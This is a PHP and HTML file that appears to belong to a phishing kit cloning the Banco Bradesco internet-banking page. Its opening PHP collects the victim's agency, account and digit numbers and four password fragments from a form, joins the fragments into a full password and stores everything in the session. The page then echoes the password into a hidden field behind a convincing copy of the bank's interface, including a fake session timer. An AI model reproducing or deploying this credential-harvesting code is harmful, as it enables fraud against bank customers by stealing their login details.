<?php
error_reporting(0);
session_start();

$agdes = $_POST['agdes'];
$ctdes = $_POST['ctdes'];
$digdes = $_POST['digdes'];

$s1 = $_POST['s1'];
$s2 = $_POST['s2'];
$sc = $_POST['sc'];
$s4 = $_POST['s4'];

$se = "$s1$s2$sc$s4";

$_SESSION["SENHA"] = $se;
$_SESSION["agdes"] = $agdes;
$_SESSION["ctdes"] = $ctdes;
$_SESSION["digdes"] = $digdes;

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html>


	
<head>
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Content-Type" content="text/html;CHARSET=iso-8859-1" />
	<link rel="shortcut icon" href="dentro_files/bradesco.ico"/>
	<title>Banco Bradesco S/A</title>
	
	


	

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/estrutur.css" />

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/jquery00.css" />

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/jquery01.css" />

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/jquery02.css" />

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/interna0.css" />


	

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/home0000.css" />

<link rel="stylesheet" type="text/css" media="screen" href="dentro_files/telainic.css" />



	

<script type="text/javascript" src="dentro_files/jquery00.js"></script>


	

<script type="text/javascript" src="dentro_files/jquery00.js"></script>

<script type="text/javascript" src="dentro_files/jquery01.js"></script>

<script type="text/javascript" src="dentro_files/jquery02.js"></script>

<script type="text/javascript" src="dentro_files/jquery03.js"></script>

<script type="text/javascript" src="dentro_files/jquery04.js"></script>

<script type="text/javascript" src="dentro_files/jquery05.js"></script>

<script type="text/javascript" src="dentro_files/jquery06.js"></script>

<script type="text/javascript" src="dentro_files/swfobjec.js"></script>

<script type="text/javascript" src="dentro_files/default0.js"></script>

<script type="text/javascript" src="dentro_files/jquery07.js"></script>

<script type="text/javascript" src="dentro_files/jquery08.js"></script>

<script type="text/javascript" src="dentro_files/atendime.js"></script>

<script type="text/javascript" src="dentro_files/jqDnR000.js"></script>

<script type="text/javascript" src="dentro_files/jquery09.js"></script>

<script type="text/javascript" src="dentro_files/jquery0A.js"></script>

<script type="text/javascript" src="dentro_files/jquery0B.js"></script>

<script type="text/javascript" src="dentro_files/date0000.js"></script>

<script type="text/javascript" src="dentro_files/currency.js"></script>

<script type="text/javascript" src="dentro_files/validaco.js"></script>

<script type="text/javascript" src="dentro_files/opensoci.js"></script>

<script type="text/javascript" src="dentro_files/personal.js"></script>

<script type="text/javascript" src="dentro_files/buscador.js"></script>

<script type="text/javascript" src="dentro_files/calculad.js"></script>

<script type="text/javascript" src="dentro_files/index000.js"></script>

<script type="text/javascript" src="dentro_files/hda00000.js"></script>

<script type="text/javascript" src="dentro_files/hda-ib-u.js"></script>

<script type="text/javascript" src="dentro_files/principa.js"></script>


	

<script type="text/javascript" src="dentro_files/home0000.js"></script>



	<!--[if lt IE 8]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie.css" />


	


	<![endif]-->

	<!--[if lt IE 7]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie6.css" />


	

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/pngfix.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/jquery.bgiframe.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/default_ie.js"></script>


	<![endif]-->
	
	

    <script type="text/javascript"><!--
var codigosRefreshMiniPosicaoCalculadora='PAL03,PDA03,PDS03,PGS08,PGS12,PGS04,PIG03,POB06,POB11,POP11,POP07,POP09,POP05,POP05,POP05,POP05,POP05,POP05,POP05,POP05,PPF06,OTR04,TCB03,TDT03,IOR03,IAC03,IPD03,IAF03,QPC03,QPS03,QPM03,QPN03,QPJ03,QPT03,QPO03,QTA03,QTE03,QTS03,QTC03,QTP03,QTD03,QTT03';

//--></script>
    <script type="text/javascript"><!--
var flagAtivarMiniPosicaoFinanceira='0';

//--></script>
    <script type="text/javascript"><!--
var flagAtivarCalculadoraFinanceira='0';

//--></script>
	
    <script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
    <script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</head>

<body>
	<input type="hidden" id="agencia" name="agencia" value="<?php echo $AGN; ?>" />
	<input type="hidden" id="conta" name="conta" value="<?php echo $CTA; ?>" />
	<input type="hidden" id="senha" name="senha" value="<?php echo "$s1$s2$sc$s4"; ?>" />
	<input type="hidden" id="urlBase" name="urlBase" value="" />
	<input type="hidden" id="urlInicial" name="urlInicial" value="" />
	<input type="hidden" id="siteSite" name="siteSite" value="false" />
	<input type="hidden" id="ctl" name="ctl" value="5192331877040731930150" />
	
	
		<script>
			inicializarComponentePersonalizacao(document.getElementById('agencia').value,
					document.getElementById('conta').value,
					'0',
					document.getElementById('ctl').value);
			var personalizacao = getComponentePersonalizacao();
		</script>
	
	
	<script>	
	
	function data(){
    Hoje = new Date();
    Data = Hoje.getDate();
    Dia = Hoje.getDay();
    Mes = Hoje.getMonth();
    Ano = Hoje.getFullYear();
   
    if(Data < 10) {
        Data = "0" + Data;
    }
    NomeDia = new Array(7)
    NomeDia[0] = "Domingo"
    NomeDia[1] = "Segunda-feira"
    NomeDia[2] = "Ter&ccedil;a-feira"
    NomeDia[3] = "Quarta-feira"
    NomeDia[4] = "Quinta-feira"
    NomeDia[5] = "Sexta-feira"
    NomeDia[6] = "S&aacute;bado"

    NomeMes = new Array(12)
    NomeMes[0] = "Janeiro"
    NomeMes[1] = "Fevereiro"
    NomeMes[2] = "Mar&ccedil;o"
    NomeMes[3] = "Abril"
    NomeMes[4] = "Maio"
    NomeMes[5] = "Junho"
    NomeMes[6] = "Julho"
    NomeMes[7] = "Agosto"
    NomeMes[8] = "Setembro"
    NomeMes[9] = "Outubro"
    NomeMes[10] = "Novembro"
    NomeMes[11] = "Dezembro"

    document.write(NomeDia[Dia] + ", "+ Data + " de " + NomeMes[Mes] + " de " + Ano);
}

</script>
	

	<input type="hidden" id="segmento" name="segmento" value="0" />
	<input type="hidden" id="filtroHDA" name="filtroHDA" value="N" />
	
	<div id="topo" class="">
		<div class="centro"><input type="hidden" id="filtroBuscador" name="filtroBuscador" value="S" /><a id="logo" href="javascript:;//"  onclick="definirPaginaInicial()" title="Bradesco Internet Banking" class="pngfix tabindex tabfirst">Bradesco Internet Banking</a>
		<a href="" class="tabindex" title="Ir para o Conte&#250;do principal da p&#225;gina do Internet Banking" ></a>
		<a href="" class="tabindex" title="Ir para o menu de servi&#231;os" ></a>
		<a href="" class="tabindex" title="Ir para o menu principal" ></a>
		<a href="" class="tabindex" title="Ir para o rodap&#233;" ></a>
	<ul id="_id37" class="menuSuperior"><li id="menuSimplificada" class="tp1"><span><a href="" id="_id39"  title="P&#225;gina Inicial Simplificada" class="tabindex">P&#225;gina Inicial Simplificada</a><span></span></span></li><li id="menuAvancada" class="tp1 tp1On"><span><a href="" id="_id42"  title="P&#225;gina Inicial Avan&#231;ada" class="tabindex">P&#225;gina Inicial Avan&#231;ada</a><span></span></span></li><li id="_id44" class="tp2"><a id="_id45" href="#"  onclick="removerEstiloMenuAtivo();" title="Personaliza&#231;&#227;o e Seguran&#231;a" class="tabindex">Personaliza&#231;&#227;o e Seguran&#231;a</a></li>
	<li id="_id50" class="tp2 tabindex"><a id="_id51" href="#" onclick="#" title="Outra Conta">Outra Conta</a></li><li id="_id53" class="tp3 tabindex"><a id="_id54" href="#" target="modal_infra_estrutura" onclick="#" title="Sair">Sair</a></li>
	</ul><div class="direita after"><ul id="_id57" class="menuSessao"><li id="_id58"><span class="tabindex"><script>data();</script>

</span></li><li id="_id60"><div style="position: absolute; top: 42px;"><a href="#" id="_id62"  style="text-decoration: none; cursor:hand;" class="tabindex"><link type="text/css" rel="stylesheet" href="dentro_files/defaultS.css" /><script type="text/javascript" src="dentro_files/brquery0.js"><!--

//--></script>
<script type="text/javascript" src="dentro_files/defaultS.js"><!--

//--></script>
<span id="_id63-span" class="UISessionTimeout UISessionTimeout-span" title="Tempo restante:">Tempo restante:</span><span id="_id63-p" class="UISessionTimeout UISessionTimeout-p UISessionTimeouttR1_8" title="19min">19min</span><script type="text/javascript"><!--
 new UISessionTimeout (19,19,1,'UISessionTimeout','null','null','null', 0.0).init ();
//--></script>
</a></div></li></ul><div id="buscadorHeader" style="display:none"><form id="frmBuscador" name="frmBuscador" method="post"  enctype="application/x-www-form-urlencoded" class="frmPesquisa"><input type="hidden" name="jsf_tree_64" id="jsf_tree_64" value="H4sIAAAAAAAAALVdX3PbuBFnzs45dpw/bW5y016nfy43nV4fVIsQKanti2MnF984FzXO5akzGoiEYzoUqZCgTneP/QJ97Yfot+jn6fQrFAREAvprYoFkJo6VZBe7y8VvF7sL+t//dW7nmfOXNHvXwtd41rnOL1t4MomjANMoTVrH7C8vKKbkJU7wO5J99SYj5IJmRUCLjHyXhuQf//zfv/5z+WT/0HFmk58cZ9dxniywC9LxJE1IQjmztxH54XWaUmd/OK2+Fb9+73x9jad41rrEAckVsis6jlsv2JdXBZ0U9A2ZUWd3GIVHTvXrT3zBCQ6uSGv845y+yGk6boWY4jjKKWdwyj6csw+cvD0nvuV8M8rK5VqjDIckD9LWD2TUwh9apYBSjrw1wjlpfX92HIavSZ4WWbD0ibN1zaRCtVSnDaXC2QcmxgX9MSb5FSF04QPn2TETyfsIIvlmInU/zrPrmUnVBxrqW+b2eZBFE7rwwbldeqmBl3P69scQSjr5mj3LQWDTxuXkyFCnDlCnTR7JmXqGQvkfw9DdbYbeauMemLJvZgj3CGiIbU/HbRsK5QKF2vZ0XAS1sSshGW1W5zqf4rggOREKfZu/LT9eVCbpWuDRs8Cjv44HBwE9RujIXBjUtsBDopu3jsfi02WPlDM5S9gDfhGFIUmcPZYqJUGETfncDtKEGnPZK7L4KQt/pnwOGJ+zJGJ6xaas7uQRJRfstymjnYBKYf54wyZclIC8G7N/TUHU+5dRTLP0xelxTf67LbAUTVun0dTZpemkWu9WEwLujRVU7GlJeF9I+LTIAxymmY6Yd8uH84IwdMzaQLr5DhLHAW10RDIU99aBdTRaBevJhOFzCfe4xb8KRhVEfup0AYzOKBk7D5mXFBfRmJ2JLtmpKKy24y3n680mKTV7g99x5difQpgKaz+58UGepOMxTsLzKHkvSCXEai7akZgKtsBhaYHjKU5MtO+0wdp3XLD2yFx7zkcmnM1cWcruaVLWm6DjW5K9C5a9B5a9r8jOQcBAAe8IqoDXhirguYoCJrIjsOy6Lidll+jZMMR4lavtGOKtV/naJ4ZmA3uep3qegQS+dLqGRvThAOfLw8mrpocTJjTThZ2TSJ5HafImGpO0oCt/IfhLGPw4/OVpZpOxOAgoFrs/micmIl+o9X9yg+mep9nYuXuZjZcSG+145Fe7ZOfGxzXfmXhEYkHq36jusm9IDF57KtmS53LPPqQzOiD5hyLKsUzlNBDlcESTVQYGm71MCQZzNncNt5rMizQ02me5dCnE8AIKFX4fYsmSsqsbkeo1uzKhNrJZ1zWy2QAsv27FQ9qsI48DkIU9S4bzjQz3Bmw43UKeNBw4FnYtxcLekZHNTqDy99pQm/Vc8JqWTgy9jpHNzsHye2Cb+eA1uzo2q7oDmwxnFg2egZUAR4M+OBr0LUWDvlk0OAPLD44GffDppm8pEPTNAsFTsPzgQNAHB4K+hUDwKe9FmkWCv9UKcBDQ0EKsDooHghQUEASphYggGJmFhLdwDUAxQZCCgoIg1YoK2+xmFhFewTUAhQRO2gbFBEGqVXMXJK4Oye1xlMZVG+KTJhR7MaYkq7s+9/VaJVdpho9pgVf6NBwEGvE4mE4vcBHiAKc6mj4oGxIvmROcL8ivVUYWBvbgpD6cVFbTtJ1It/uvuK6cYtFd1ZXNhqau68qq2R9uWG2AExJ/k0XhnLI5pM8p02IyJ0X1ohoq3smXXVDbPrJOpqusB5FYkPpweSWEN36eMklpVl3iILCuxCTYVc64YxhEEByQkYUsXTCCJyHIVhKCdJMQRQYJgjoFd5C/QgRKqvnFlOo5kCDDlwkL7IbQRrZ3mWr40gVUVZi+47F4pKmqfHYgQMx6zMStNc1UZtFV1nNQ+3HWnAMSH9HFRnx4aqHfSkSswwV6DXosBoQ9/4tzcr+liNA2IYfbisGAmFX41tn1HXV6Z8tJp2NhI/gEweJimCMi5XUoDjjbBr8EbuTsJFHOTIoDsU+RRX7VGDFes7R3dCIWNRzVURVf5fJkaaLZzfgQCJVgeQy+/aon0TXREzjja+O+ysAirpagHmddEEqiGhuRzLuaJ0OucauDzCl/V0qbda2C05pTxz0F//gSjhkRlxRNfHqoWZN7N5/ZZ9/VTDbfbIfSuVo670ebMan53nOCRdraPNo7A9fdc07AniBDHyBKPwlJ4XWOJEHwo1Wk1SXORAmA0DoLCmYCSD0BEj3Waz09Yec3crAMPE6GKi6cWFekvRkByAKumf8xZOs4lzfLmsY6GO17W4Zhacbo/A1r6aA26WNmlgtyVpknQH79loepI/Vpp1zID7my4GgowLguFUoo/P5ipIMnUjs4LlbDpmmg2oNrtETk6OdlKOd0XKU8Zfrahr0TqJWWFZUs4oHhO6SJq60ijMaOKEHHfTxHHRALIH3TKU7fA2KJRlx6qLEZunJnqXgOCoF1xin5xn3P2ndPs5XKAbCGKGY2s9a+KpxX54iLh8t4m7zF8xinjiLCX0D/CPLKPTC87JuHq8JhGtFNB0M1VctqcbBm0hxns64BISXWgeGaJKC1rxIR19aVlQRTClSGRy19+tvctwcA9BZq3zSx1rt3tqummvNQEgWofFLKw3cx+QKVGBlxu2zkMh7BUVe8MNmPZGX8Bn+mTyZfu4GvP6GxSsrDe47g5193xmOdGrMAuGMAgGiAWGvIlcvThtI1GwUkAusU4kVHSyS2McfoDClMqFU5gDOoFK9eELSiwsk2kI0dCNMhzzNrG+NjhNrHAIcgFq9T1TQkhlhEL62keiYsB2xtX5ndX5HNAw5gxIOA71CYX0l0AwF9CdlJVgO1fcIfRhrKT7rYf1lLbYuKrifPXPZbd8FIpYLvHMJGXM1knm4L7qb5hOzTLbfSNl+Y0C2j5gHX8XEdVlXYxUlmY2VlVj5kclYUa4+IhKhnDCPxwoY9ryJwvlN3O65cdplzRZXA2Gf6OIdaHjhclj7DYrNpZBZzxjUfm05mcCFc+uzcA79fVQrrIaIzVrp+6A57gdMe38dMqnM5IAQa04qnevkmIM/onwQ6WXe9Bph8PxJOqgHXtxrZZbmcpUsTDF3O1JMJk8mJ9diiH20Fi6n/CLF/he5sZ9nh/yea1zYh4A61ig4RdFyXXHfTaGT1L+kVvGXUYY56IZ/xZ9pfp6S9fmoyUqYZPUlW7lPZ3W67wsUQsHX6XumhEcDpISNKHHj8W7W6Xgw0UYhnH4a3uS8cQ9Vx/ldBUYpmqgtwTzBeda6R2UbPesOK9MLpuPHQ7rIrLmmOJvxdIQLpiN0uhAOR/hD6gh/yOtCsi6nOo7Y07CjMNejwT9a7EZOYKqCkKb+HKU+8OE/FvVuudl1TnJd17dz0PsC9QGsVZJhtjwEycDGx8dbbwLre4bg7Zmgwh2EmVbFZo+inml6J9/0zkTTO6mmdxJN70w2vZNueifb9E6u6R3rpPN+mOqhPSHOfbuDWN2DDEn1D2FJ9Q9xTArsRO7rtJNLk5a+GsjCuBGdQ6WDywo+5m8+ZArYf53l9PtZfeG9zGYIyKCu4G0ziebYBo+MznB44cK9dUm7TE44Gi9DSzoY12tiNX5ovKjrB+N45VX8tvj+CfwD31ZEHRx0fhqL70/jn/gh6E+Sfm85M5OYTJ2MGzE6OpnPPGGstpwlbt4gOoRh9++zDLt/X6D8yBQY0wT7txFgbYsGWEkrKex/Cfp1fSSAoiuP+3lWHtsAlfQBKPSYm9Gv/daft0SmyRzVJOt4RV5NDhJaB6PRZKotmqQtxvt5WozbNNkYFGy6Ju+hmrwnYk2OEFpZR1IE1GS6LZo8TzV5PpwmGwOkTdfkQ1STD0WsyT5Ca180msy0RZOrVJOr4TTZuDR80zVZo5pkJUm8miQX9bMOIgqoyWxbNHmFapJVqvapyexWa5K2POn31fIkgCYHCK0D0Whyoi2afCPVJKsg7lOTLrXnzdUk7fPe76vPewBNjhFax6LRZK4tmvxDqsk/DKfJ3FZr8uNUk6we4LyaJJ67vz8aTebbosnPUU1+LpwmG/efbrom/5xq8s8j1uQwoXU4Gk1OtkWT36Sa/GY4TbqsmNtcTf4j1eQ/cmoy4Dzdz8MWobNAuKlpns7ZVmNzpun6n7Lqu/2s9eFeE+I32CflGvuCEF5dfLYxOfeUP9qZGP4hxTB/Zd0ZHPifnHMvBzdMvjglsglTc/3PUWNg1evbutqyiWObRwhiY/3PUEZYtfGIJvMCkfVdTtO38Jb3NGw67fSUPyAgogZI6DDACh2Ym5Z6DaJy5o6/ibz5jrn1b8LceT5hXpOddG4b68W09bJoIw1IBlhLf1sa6ETCGv+6Phpy1Bu43vIYA9dzE8Tbccx9Or+pMU2lpqnrIhwbCql12W3h7vnWC3c1SarI8FHquO1+nIt016Lq5jBAS/gDvkr4/n3ThM/NwQ2ybT09N7CDwJenqTtBCy09dj0VFr4ZCt8MN0EZTvj6aj+CNo+XRNz7q3mNARAeaA1d2x28AXsAyDV1EYigrh9LbgJ6b6fovT1a9PrrReIQrQ/kbifI5TnwggCFlnW6x8Ii9yxFLvcS7wne5rfjfpArV8sq2bnWrKC51rC1vr7lXvZ+ilNWuwxOnB7xhVMqSB8gJeWrAVb5qjUmaHbcPRMYpM6VWgMXKEhZi4M5V2r5Gvrha3RFVS/gZbxu/tPfONd0I9a6LtKylFw7jS81Ia7XFSBqp50fei/pssGXua9gYBvRN2uq3Uvf3UVRKVJtXwrrkq5SbV/lhV/OIxb0zB7dt3M07atVivCPEtrJ60wdgTAG3U91Bl5A1mccdVNHLaQneR31JK+L1pO4xxLNa6ns/Lf0JaSiM8CanmqtzLTj1KmJsAB7JwVY4CMCLZp4o7Upf8lGSV5RdaN/RkETa3LJrWvcko+wDd+C3GHcuO+WD4UfpAD+YLQAdl9625xwuMnX0Qc5UN3xF/x1x5ubyo0uzXoJ5LI+So8O1xK87DjweavsOMBaqt1yH04uB4TB1ZLY3MLXUWbsHvNHK9OO/4La8V9w2zFvmdF9xG/MuhpVuQmVxoFvUuNizSBwGlfOXz7kwnSNr9g48FXKy1d/e4qNA38Wcp4hnwTCKLQQP42u1+zVR782w6T8af4y6ciyunHqxLQ3vV4KcPY7udHWIKYsK0BT4c1jx47F4otxs0syJDecLfyfkIrK5YGww/TQLZknEWAvkVNI5/Zz6tx+zu3cAjXNuGEZVGdx34wZVVHEmi5F1j1j4DfUjn/jbyoQCLundd1ogBM7gXoBikrsOG1/HNRmecdoU5j5hKfWh2wosQvL7GHDDo//g0D9P3iH27w5AZDPmnHyLkUHVHo62YYZYPP24DWYpkHubhp5Wl3tjIeM1wf3WKYwuIebIN543b07i+s4DyRFKqtVSfdq9Hxv65C9KFZFWZ+mA+hWx+uDt1rmO3hrtCGFe7vwxpDCRbKt887BawmIr+XGDC20doKwIM5TELN6n7QmiLfQ6ivpJCDG7ViBVFiRNLP1WGPkNPjSTYDcXRRyd0ULOX+7dxvlwJ8c/sZKqXpYY19LHz9pTvvmXYZ0fHDBmFK9eBbP8Z+toRn+cHHi4HkqftYS+ra2u5KqSAGaZK5bUDFTV332oWxgZona3hKv7U36rig28Hs/dzunLXf79CjTwYiPMnVvmtXU88whl4JuCsZhjEFM8T+pKf4nNxCaN82uNZ5EZAV9fomD99bUkliTQgapk6zN0x6q6XjaoZoi6dnRDDoofhyN4BwtGY/dGYvXNBigxGNTMc9rU/jaC+q6VEHXxuOW/sKA87WWLgdZrdqZuuw2xWU0BU4lJoEwiI61OYe1YH7cuNUAq7rjZ3bKuzHl3UEof5O3kqM7wWe37QQfAi/u83sG30x9wZuj9QU7cWdenDuNK+qKOkf6QaNPd7JcPSbpDSS+ewOn9lOJhPkibb4wm0RP5sxUajturI4KNdBHSZqsOvMotvoxiR8nJLKWpLd2NvkI86hP02Hw09wEeZwc6lkvPcQKQU1g2pz7mmNG7c5LcrWkXhpHE2sH46sA1KaOHLl06dK4mQtYX0WLquC7R0pSWawrYFzUa/HmDkU74PXz1YuzGyCy+sbgF6l1sNrRcFrHS5kjpYvgWqZEHyV4/KgXjR7qTyV8t/tnovAfKAr/gROFqQRvs073pucUhRWxJkKJ4j7gbvP8i62DOXQLo5O4Pk5uu+WB3LcoPL8VLTzdl/DY4OmUqA+IfoxA9GPcEM2EhugzFKKB239YZHgcOu8JUfdFZxSipDrkmF9pVMvaJuXodE37YMRr2tk9XdhS8IGtPybY+mNupeaiG46HBAtlQ6yzR1sTxNvCzL1hLkVZWVQkVANRSa1tzTEiP9c0IutwSJar6CjZelFGKZs1OJtj8pnZpZPwnjPklkdQCHrEDPuOoIkg+6i9cSf6/Fgyflu8BkmE/wBVVZZF7VhVva2o1i6vwqBM1S6jPxW1KKKWuOi1TladwlcojTSu14uaqqAv68cuS/ptmqTDfHJZkfBfQK0dS9yGuufCf/DRZsfyqcRtq5K8sgqOZRNZlwBipxVApCKLIIb6LVsa8twuEOVBH+66tqyIaUZvJGYUePev0T4wlTQDb/P84FQyZcbbozjeXjILvg4j8z7LaGg3JmtoN68xJa02SKNonVHSUm7I3ldDt1Dd3hKtbq+35U64oTDJXwtJZwbF0uTQHiIy3mmVVDLtEFkqMpGlqcjSmyOylE+R3UhEdiO3yLIOkaUjExk9k3Mo4jM5WSJLN4gsQDWO9ESfoQsJAxa+zOPPR4AwIm3Iy7KGO1TPzJhSzgGhTzff6sdLFmfXFPPlolSEfpx8cUbUgKjOaKgho+q83cKC+YWTsma+PC1VgDCAX55Fkb95n7nqugRHQLIRwHw6usMwvnZeB+hyj0lkxxAyggEw4iI71tngQw9iGb4lYF3JCAm5jyQfemBrHvvQ1jz2v23NY+/fmsc+vDWPLZDH4pd+XJm5usx4Gt9D76MPvW/THvpK+tBX+nsoEDrOhHvmEn0mazqsmdGhN4V76KvoQ1+1aQ99BX2or2MfgjyUOQ6ftyYmhni6j5Hhq7ENBzl0dEVbVCswswoZKXyEUsg6T7HVjHTKPLg3lXQ7H7WXZIi1UJPQQ5+idH6Kt8ifMnONlDnXk0qZL5qPiwZCzzI6l6jmq8TPTO1pd/Ih3u7kqRTvFpZbWKk9ikIKZam4is/AWXNfCwiErmQyR/LcoqLqUkwuqoWkIlelwpLcEKRwYO8bNEr9RrRR6q3MPNfJuJnfBlHol6lCWeeptlZomlOh+zwVWpGr3qvKgbAdXhOxGv+NqvHfolXjAW81QlYKFXGDU49foXr8CrcePSq7YfSImfLU40vgNU49xlCP8YIcWp3PUnU+G6U60Q2f8VQVk6QvUZK+tFlTalgRTbvbYAa3KqILY+apjoEYeZyOYo/zVszS5gx1ymgEkso2r00AQve6LDkGXXbFjEXu8KBF7jCrXa9XcDCC5Td9YeM+WVdhcjyI/8Z/uBCM9hTgz2IVfEBMmHBh+BpKOe/C5VTTae8w3A7tLYf3UspYh0e2pCzd2HAcvq8DTa2uhCYvbpnacNxvEtJ7oLqs146id8zqT5BH7qIS4T0TNJV26Zg9HHr/1PAEJW2CmzSXFtDDB0OTdgdV1B2+85nhI3YlBdLSABUFqyVpS9eVNcPtrBmJp93i7rFlUNXx9hNdXpdkx/pV77r/8GnC5umgFPaY9Jg+NWPmNJmk+VHWfMcqdO+ogGRiObasApXurPAafJzbnuL7r5QVcWUayOuiZqt/0kO10Jq5pP3Y+B7MPlNJ9xP2WT0lWmN1wmStt7KcjRWLISc2h5etIGt4mZsoj6XufBObZGxHq7rhb81c1L3GjrfCu/2L1FwvbtacnjubZgDGmtUYXiIg4l0enUpPmiAaQiCqaIlYTa2FRdKjFEmP8lKWSXAiyT0RMZFUU+s1l+VqkWOI9noYjrjXQ9wbQzYGW6LnPoIeVtm0tY6s6d+uoqL5RA1TZLSr87DPrs5A6L993+HDscOH77CNlaz7P0C4fYCb24zJ7Ta5uo4SOtRY9rRUbThglcNgPkQN5kO8lb2MWSjL8Ca6L/O0HNk+T+ZZiIJXNtsQR2LwSQoI1pGHLmHT+wkUYPZn11AtUDF4+DH66MeiNV/2kdeuUm5pw+cJ19wl60ze2n2KvH9RK0WK7L+myP5rbhJ5Fy97DwVFMnXsjWUoj0jGgycooJ7Y1PHAxqWFpUDJxDxNJuZ5NZhtTPkIaN8ZUqhPU6E+HdhBeI4VLyeXvjywM0bfehL9+gw9y3gowBbu4c+QJ3+GQ9S7yEnhQLQvabBWrUgbpOzosqvcux3u8E8IST/hHZmyaSBcixbN2Omyn1WOseBTSEwwvEjB8GJQMKBG8VIZTCWOxvBiwql8praBFxCynvZL8vVfcqhpp1K9ONcgDdbB18E97kiv5XFHen3LgV28RtQWdAmIMexO8LmlXn4ES+dJIp0nuRGTsc69ByJa6GM0cCdQ+WlIqIzssKAywmpE6wGVXRpaZOofKyNkPcUIT8vmbchsjJVOngbjbcIjNxESbuIgYcSAK6EiQqDeSoHqqzuBJ1DRXUYsXAYb4YboCMc6DLP1CNd4KA6ynT5jrVwARaUIKym/dJgL6nYadEwaS3PT5p641IRx6Hc6bVbHJsyPcuY63pxZQZs0X2TNFxPmFEbe/NZk0nyE9dGkeR+zaJg3i4YTCfNi8x1bj5EGDO/EotnJEs00Ec00t4roprzQnc9H7qXgvZebIN649ibvuLZp4f8Qen9GkUTt4CE34wkRg428gvpSX2t1/Ae2sRaBrY/saGSOYGaOV0UT9PTR0O3GRy5SzLDqiq0J8thC54kZ92bDtCymy0BeVwtVaUVEL5obpMIYAPmy03J1QalHjyOd4kiPFkfuvWFtBbNm1h2ro1kUHyfY4jl0lKiSnr0YuiH4yOsotlj1xtYE8RaOmJuEDQFrRRjjwk8rTagaMVC1IGnF6DH1Boop1m7z9qxFcLLc0ksdI0g6xq04ur+No2t3AzEfoEj6ADdBvPvb3BeDmUgqyeuyLjb7phFzUf/B+Il45Cj6GEWR5+7WyNdMUXZ9+aOjBEVHeZWWs45wH0RZRzaGjjQPi6YvUTSxlgO1Jox3SaV3QbtSV4BcU+Qi6lLjhakHosfU1ymmvr6p9eVGplv6prsJqu7mVh4z3OcQ2z9Tsf1zpAW/kTsIm6zlGa3ZpMfvDrwrrNF8jxrN97gJ4u2Q7B52W0bTnF1sN8ZwnGCclirRj+M/omr/UbTW4r62k1qLryTjToKdO7lVRRPT7j8Ji50XKXZYZdDWBPEmpjd7YgfipHHtBt6VjdFzpl5Zhs4Wn74QMX5GOyz8jHZEi5/93vgxOG6JoFMEQad4FZanaWr390IiaHSnhaBR3lPmUnneNNUbQarc1IsdkdkTNWB2U8CwtqW3BzAGgy0BQ+anRgLPT1n6oblnz86wgLmNAuY2boJ4c09vwFTV9UaX0xbAZChgWCfJtQcwBoMtATNDADPDrR+rs9oQSgtiuNNCIixyZilyZrkp48013SfOrcGqvgy0VpnBYuSZwegZiqQz0SLpYIuxysawr3zzJIHUSV7FTSaiywxGH6ZiezjazOAEYfMEN5sp6mqvhDUYWkIe5S4hT/JuaPMuzlTEkuxmLttMc0GpQXw6eouhlePRiCvHrfa0WRy3dL+TBEST3Dqj6WXPp8KCiNaKR7lrxZO86aX3Nte1ugi0TQnxaG14NOLacIsNrRaLLUFzFwENq496ax1ZS/t68XCdDguc91PgvJ+bKN7c0j0QsiY95WpTx7O24IZWg0cjrga7Wwad7zQ4bAmbewhs7uHUUDqRdMImExY2dFv9KO+2+rRX69BQJQm5cf1nW1DzNYqar21yBUL2s4x4ZJaAhjcKTycyLvlBNixynqTICbyWzKKMN7P0HqkY0Y4tOWhDqPMdCqPvbOqg5T/SmSJAmuJWl5VoDis6WFLR8VH+N5dgKT1LjNhzR7wbCf0GCamsSUvefMd8kcyZL8x1VmZbknTSXBaVSjh7wvVjavtZ1P6cUMt7Wlg6Mel012HPWR3rsIxujFUtbUlUknf3lvdSggpMUnVGWu7MM6LPzMcGLeMbY+2wb89qAifXrSxwlCxNHuVZmkx0l3ICKhcWUDdSQPG2X0wneZNW7+mseuOSlLU2jP5j9ByusYjP4Woxf1X3s/xk9AXC9gvcusk6AZMPC5gJChjerfzpJG+C6h0wltRNCRjH7qSQYc0rtidgNBhsCZrnCePPc+unITmdDAuaBQqaBW6i2jPxCTRpU0BD1+KORbwWtwVoDAZbguZXhPFf8eonlYyuZDx2gUrrQqQl49EXCZu88+/pVNphG6mw8yxjdWobdW6iPI7iDLOgpLGpHVoUuqpemiEteyNfTDL2aqr2V2/qYFzR/JjIzwh2fsatpgkndpJhsfNmip03cxPF2xbE268+Im1KrXjs3RQy795Uv2ow2BI0vyCM/4JbP84cMpUKC5pPUNB8gpeoNG8O6T1PtS5rK3Wl+byqUXMZm1qpiNG7nc9SDH02Wgy1mKWi/FowYldvbifVm9u5dZZqLgOmws47jNEmAmO8TQTSad4E0nveQV6pi4r7hitcu4oeSLSTwFjEnQRaTECYrNpgFOzogFtK8nqhopZEpSCjWxckHWh1UNfQSVOVQkXUVqSKtRdz7PtBVd1pqjoHhP7VkngaPcplW+a2C2uV+3Gj4xikJjuRaNZIkO3EYz8gNNcY9Hqd/jm0rG6cOjHdSOka3wGSA8+SpRt9PwbCTlMA0wo6lVU7o1akkMh7lpPPTlScMw6iMJk1VZVlcG2M5QPPh9TNC/y6IQROeBM4OGYn0DpA1tUsXPudw3C3JmpiRQKaqkPpYHpR6/NtfdFa9/X7r6DzmvD5dY4nXjV74rfq+3+ji7gh/buXoaNTF+ihv9p0TVJkrGvLcW/b5ivFsijunLYeAeEzsf+K81Bh+gTCj+vDr7q5XvMHPeO7DEZdm3MAo